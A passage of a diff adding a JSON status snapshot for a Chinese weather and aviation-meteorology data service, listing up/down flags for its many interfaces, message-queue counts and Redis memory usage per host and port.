+        "SG85,新宏_航空气象服务接口 气象要素图例查询 GFS相对湿度图例查询,": true,
+        "SG22,新宏_航空气象服务接口 实况资料接口 地面实况序列,": true,
+        "SG101,新宏_航空气象服务接口 Redis信息查询 查询redid节点信息,": false,
+        "SG72,新宏_航空气象服务接口 民航机场实况、预报 请求以下URL查询机场四字码、时间、天气现象参数,": true,
+        "SG103,新宏_航空气象服务接口 欧洲EC数值预报 按经纬度查询单气象要素3小时预报数据,": true,
+        "SG70,新宏_航空气象服务接口 民航机场实况、预报 根据机场四字码准确查询民航机场实况气象要素信息,": false,
+        "SG74,新宏_航空气象服务接口 民航机场实况、预报 实况指数查询,": false,
+        "SG87,新宏_航空气象服务接口 气象要素图例查询 解释应用 云底高,": true,
+        "SG54,新宏_航空气象服务接口 GFS资料 GFS当前时次（多点）空间剖面数据查询,": true,
+        "SG19,国家海洋环境预报中心_海浪预报接口,": true,
+        "SG11,ICOADS统计表格数据 单月风浪,": true,
+        "SG77,新宏_航空气象服务接口 空气质量 按照站号查询空气质量,": true,
+        "SG17,TYPHOON原始数据（单个台风列表）,": true,
+        "SG34,新宏_航空气象服务接口 城镇精细化预报 按经纬度查询单气象要素3小时预报数据,": true,
+        "SP8,新晨,实况,nmcrealFC7007.jar": true,
+        "SG66,新宏_航空气象服务接口 机场、航班及航线信息查询 根据航线identy查询航路点信息,": true,
+        "SG56,新宏_航空气象服务接口 GFS资料 区域数据查询,": true,
+        "SG52,新宏_航空气象服务接口 GFS资料 单、多点GFS实况数据查询,": true,
+        "SG68,新宏_航空气象服务接口 民航机场实况、预报 民航机场实况模糊查询,": true,
+        "SP5,灯示图,airportLamp.jar": true,
+        "SG37,新宏_航空气象服务接口 城镇精细化预报 按城镇站号查询综合气象要素12小时预报数据,": true,
+        "SG67,新宏_航空气象服务接口 机场、航班及航线信息查询 机场三字码信息查询,": true,
+        "SG40,新宏_航空气象服务接口 地面实况、预报 按城镇名称、站点、经纬度查询地面实况信息,": false,
+        "SG3,海洋一所图片接口海水温度,": true,
+        "SG25,新宏_航空气象服务接口 实况资料接口 空气质量,": true,
+        "SP2,新晨预报,总,xchk.jar": true,
+        "SG93,新宏_航空气象服务接口 气象要素图例查询 解释应用 下击暴流,": true,
+        "SG100,新宏_航空气象服务接口 Redis信息查询 查询redis中目前的某类key及field数量,": false,
+        "SG26,新宏_航空气象服务接口 站点信息查询接口 据站号模糊查询气象站点信息,": true,
+        "SG44,新宏_航空气象服务接口 地面实况、预报 地面单要素3小时预报,": true,
+        "SG98,新宏_航空气象服务接口 等值线颜色属性查询 地面温度等值线颜色属性查询,": true,
+        "SG91,新宏_航空气象服务接口 气象要素图例查询 解释应用 能见度,": true,
+        "SG24,新宏_航空气象服务接口 实况资料接口 强对流指数,": false,
+        "SG13,ICOADS原始数据,": true,
+        "SG57,新宏_航空气象服务接口 GFS资料 大风指数,": true,
+        "SG61,新宏_航空气象服务接口 GFS资料 雷暴概率,": true,
+        "SG10,ICOADS统计表格数据 单月气温,": true,
+        "SG58,新宏_航空气象服务接口 GFS资料 云顶高,": true,
+        "SG14,台风接口,": true,
+        "SG28,新宏_航空气象服务接口 站点信息查询接口 据中文名模糊查询气象站点信息,": true,
+        "SG5,海洋一所单点数据,": true,
+        "SG48,新宏_航空气象服务接口 WNI危险天气 单点危险天气数据查询,": true,
+        "SG73,新宏_航空气象服务接口 民航机场实况、预报 将参数分别传入如下URL地址中进行请求,": false,
+        "SG51,新宏_航空气象服务接口 GFS资料 单、多点GFS实况数据查询,": true,
+        "SG76,新宏_航空气象服务接口 气候产品,": true,
+        "SG96,新宏_航空气象服务接口 气象要素图例查询 实况6小时累积降水,": true,
+        "SG97,新宏_航空气象服务接口 气象要素图例查询 实况24小时累积降水,": true,
+        "SP3,3h预报,cityFC3": false,
+        "SG16,TYPHOON原始数据（返回单年台风列表）,": true,
+        "SG4,海洋一所图片接口海水盐度,": true,
+        "SG95,新宏_航空气象服务接口 气象要素图例查询 雷达图,": true,
+        "SG36,新宏_航空气象服务接口 城镇精细化预报 按城镇站号查询单气象要素3小时预报数据,": true,
+        "SG41,新宏_航空气象服务接口 地面实况、预报 单要素地面实况时序信息列表,": true,
+        "SG23,新宏_航空气象服务接口 实况资料接口 高空实况,": false,
+        "SG49,新宏_航空气象服务接口 WNI危险天气 多点危险天气数据查询,": true,
+        "SG59,新宏_航空气象服务接口 GFS资料 云底高,": true,
+        "SG79,新宏_航空气象服务接口 空气质量 空气质量分布图,": true,
+        "SG21,新宏_航空气象服务接口 实况资料接口 地面实况,": true,
+        "SG30,新宏_航空气象服务接口 台风及火山灰查询接口 当前火山灰,": true,
+        "SP9,新晨实况单点,xchk.jar": true,
+        "SG32,新宏_航空气象服务接口 雷达、云图接口 雷达图,": true,
+        "SG78,新宏_航空气象服务接口 空气质量 按照行政区查询空气质量,": true,
+        "SG12,ICOADS统计表格数据 （全年各月）数据统计,": true,
+        "SG45,新宏_航空气象服务接口 高空实况 高空实况信息查询,": false,
+        "SG20,国家海洋局近场环境预报接口,": false,
+        "SG47,新宏_航空气象服务接口 高空实况 高空实况标注,": false,
+        "SG75,新宏_航空气象服务接口 民航机场实况、预报 民航机场预报,": true,
+        "SP1,nwpc,nwpc": true,
+        "SG27,新宏_航空气象服务接口 站点信息查询接口 据拼音模糊查询气象站点信息,": true,
+        "SG43,新宏_航空气象服务接口 地面实况、预报 地面实况标注,": false,
+        "SG18,日本海浪预报接口,": true,
+        "SG35,新宏_航空气象服务接口 城镇精细化预报 按经纬度查询综合气象要素12小时预报数据,": true,
+        "SG1,云南省风电气象,jssy.jar": true,
+        "SG55,新宏_航空气象服务接口 GFS资料 单点预报空间剖面数据查询,": false,
+        "SG86,新宏_航空气象服务接口 气象要素图例查询 GFS6小时降水图例查询,": true,
+        "SG81,新宏_航空气象服务接口 葵花8号 二级产品图像索引查询,": true,
+        "SG102,新宏_航空气象服务接口 Redis信息查询 查询redid集群信息,": false,
+        "SG33,新宏_航空气象服务接口 雷达、云图接口 传真图,": true,
+        "SG60,新宏_航空气象服务接口 GFS资料 能见度,": true,
+        "SG90,新宏_航空气象服务接口 气象要素图例查询 解释应用 颠簸,": true,
+        "SG38,新宏_航空气象服务接口 地面实况、预报 按城镇名称、站点、经纬度查询地面实况信息,": true,
+        "SG39,新宏_航空气象服务接口 地面实况、预报 按城镇名称、站点、经纬度查询地面实况信息,": true,
+        "SG64,新宏_航空气象服务接口 机场、航班及航线信息查询 多机场信息查询,": true,
+        "SG94,新宏_航空气象服务接口 气象要素图例查询 解释应用 解释雷暴概率,": true,
+        "SG89,新宏_航空气象服务接口 气象要素图例查询 解释应用 积冰,": true,
+        "SG80,新宏_航空气象服务接口 空气质量 pm2.5趋势预报图,": true,
+        "SG88,新宏_航空气象服务接口 气象要素图例查询 解释应用 云顶高,": true,
+        "SG53,新宏_航空气象服务接口 GFS资料 GFS等值线数据查询,": true,
+        "SP4,gfs缓存,gfscache.jar": true,
+        "SG7,海洋一所时间剖面,": true,
+        "SG83,新宏_航空气象服务接口 葵花8号 二级产品单点多时次数据查询,": true,
+        "SG6,海洋一所空间剖面,": true,
+        "SG46,新宏_航空气象服务接口 高空实况 高空时序列表信息查询,": true,
+        "SG42,新宏_航空气象服务接口 地面实况、预报 多要素地面实况时序信息列表,": true,
+        "SP7,新晨,7天预报,(未使用),nmcrealFC7007.jar": true,
+        "SG50,新宏_航空气象服务接口 WNI危险天气 区域危险天气数据查询,": true,
+        "SG29,新宏_航空气象服务接口 台风及火山灰查询接口 最新编报台风,": false,
+        "SG99,新宏_航空气象服务接口 等值线颜色属性查询 700hPa风速等值线颜色属性查询,": true
+      }
+    },
+    "message": [
+      {
+        "nwpc.himawari": {
+          "producer_count": "0",
+          "consumer_count": "1",
+          "queue_items": "0"
+        },
+        "app.test": {
+          "producer_count": "0",
+          "consumer_count": "0",
+          "queue_items": "3"
+        },
+        "host": "123.59.100.107",
+        "app.jsyb": {
+          "producer_count": "0",
+          "consumer_count": "1",
+          "queue_items": "0"
+        },
+        "app.gfs": {
+          "producer_count": "0",
+          "consumer_count": "1",
+          "queue_items": "0"
+        },
+        "app.gfs.down": {
+          "producer_count": "0",
+          "consumer_count": "1",
+          "queue_items": "11"
+        },
+        "app.monitor": {
+          "producer_count": "0",
+          "consumer_count": "1",
+          "queue_items": "36907"
+        }
+      }
+    ],
+    "redis": [
+      {
+        "6395": "6.26G 16.00G",
+        "6394": "545.38M 16.00G",
+        "6397": "4.49G 16.00G",
+        "6396": "5.63G 16.00G",
+        "6398": "4.54G 16.00G",
+        "host": "192.6.1.21",
+        "6391": "6.08G 16.00G",
+        "6390": "5.45G 16.00G",
+        "6393": "6.09G 16.00G",
+        "6392": "8.15G 16.00G"
+      },
+      {
+        "6384": "6.99G 16.00G",
+        "6383": "7.17G 16.00G",
+        "6386": "8.85G 16.00G",
+        "6385": "8.86G 16.00G",
+        "6388": "10.89G 16.00G",
+        "6387": "7.70G 16.00G",
+        "6379": "9.50G 16.00G",
+        "host": "192.168.1.114",
+        "6380": "7.57G 16.00G",
+        "6382": "11.65G 16.00G",
+        "6381": "7.73G 16.00G"
+      }
+    ]
+  },
+  "data_time": "201811231050"
+}
